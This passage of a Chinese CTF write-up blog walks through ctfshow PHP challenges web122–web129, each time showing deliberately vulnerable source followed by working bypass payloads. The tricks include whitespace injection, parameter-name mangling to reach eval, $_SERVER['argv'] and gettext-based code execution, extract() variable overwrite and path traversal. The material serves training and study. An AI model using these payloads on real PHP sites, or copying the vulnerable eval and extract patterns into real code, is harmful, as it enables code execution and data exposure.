important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-01 15:08:19*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filter函数让想用十六进制和8进制绕过不现实，trim函数是字符去除字符串首尾处的空白字符（或者其他字符），这里看wp，是用脚本判断是否有可用的字符可以绕过：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现<code>\f</code>，也即分页符可用，也就是<code>%0c</code>用这个进行阶段就行了</p><pre class="line-numbers language-none"><code class="language-none">payload:url&#x2F;?num&#x3D;%0c36<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有eval，那么只用关注$c就行，只要进入if即可，在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有<code>空格、+、[</code>则会被转化为<code>_</code>，所以按理来说我们构造不出<code>CTF_SHOW.COM</code>这个变量(因为含有<code>.</code>)，但php中有个特性就是如果传入<code>[</code>，它被转化为<code>_</code>之后，后面的字符就会被保留下来不会被替换，所以就可以传这个参数了</p><pre class="line-numbers language-none"><code class="language-none">payloadCTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47##*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了echo 和flag，可以用highlight_fike来显示，用Get来传参</p><pre class="line-numbers language-none"><code class="language-none">payload:url&#x2F;?aaa&#x3D;flag.phpCTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[aaa])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47##*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤一些字母，限制了$c的长度，不能用上一题的payload了，本题要用到$_SERVER,</p><pre class="line-numbers language-none"><code class="language-none">$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。不同的参数保存不同的信息，比如，$_SERVER[&#39;argv&#39;] &#x2F;&#x2F;传递给该脚本的参数。$_SERVER[&#39;argc&#39;] &#x2F;&#x2F;传递给程序的命令行参数的个数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.wlhhlc.top/posts/14827/#web115">博客</a>wp中有做测试：</p><p><img src="/images/image-20210530183345448.png"></p><p>可以看到$_SERVER[‘argv’]储存了get到的参数，所以通过这一点构造payload</p><pre class="line-numbers language-none"><code class="language-none">payload:url&#x2F;?$fl0g&#x3D;flag_give_me;CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;eval($a[0])$c&#x3D;&quot;eval($a[0])&quot;$a[0]&#x3D;&quot;$fl0g&#x3D;flag_give_me;&quot;$c&#x3D;&quot;eval($fl0g&#x3D;flag_give_me;)&quot;eval($c;)eval(eval($fl0g&#x3D;flag_give_me;);)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-10 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-10 21:52:49*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的extract 函数从数组中将变量导入到当前的符号表。</p><p><img src="/images/image-20210530204342545.png"></p><p>所以这里</p><p>用extract函数来讲$ctf_show转化为想要的值，想直接url/?ctf_show=ilove36d,但不行，这里对$url做了正则匹配，下划线被过滤了，但php中变量中的空格，[，+会被替换为_，且空格没被过滤，就可以使用空格，且这里</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;aaa&#x2F;?p&#x3D;222 (附带查询)结果：$_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;p&#x3D;222&quot;;$_SERVER[&#39;REQUEST_URI&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;?p&#x3D;222&quot;;$_SERVER[&#39;SCRIPT_NAME&#39;]  &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;$_SERVER[&#39;PHP_SELF&#39;]     &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;所以这里$_SERVER[&#39;QUERY_STRING&#39;]&#x3D;&quot;ctf_show&#x3D;ilove36d&quot;payload:url&#x2F;?ctf show&#x3D;ilove36d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-10 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-12 19:49:05*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$f2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>check函数过滤掉了所有字符和数字，只能用特殊字符。</p><p>call_user_func函数把第一个参数作为回调函数，其余参数都是回调函数的参数</p><pre class="line-numbers language-none"><code class="language-none">此题用到了gettext扩展，而_()等效于gettext(),gettext是GNU国际化与本地化函数库。它常被用于编写多语言程序.源代码中所有需要多语言支持的（需要翻译的）字符串都修改为使用gettext函数包装起来。为了方便也可以使用下划线 _。本题通过此方法和两次的call_user_func来绕过限制。本题还会用到get_defined_vars get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。可以得到payload：?f1&#x3D;_&amp;f2&#x3D;get_defined_varsvar_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(_,&#39;get_defined_vars&#39;)));var_dump(call_user_func(get_defined_vars));&#x2F;&#x2F;输出数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 03:18:40*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题考察了目录穿越</p><pre class="line-numbers language-none"><code class="language-none">路径穿越是网站被恶意人员利用，来得到其无权限访问的内容通常是由于代码没有判断 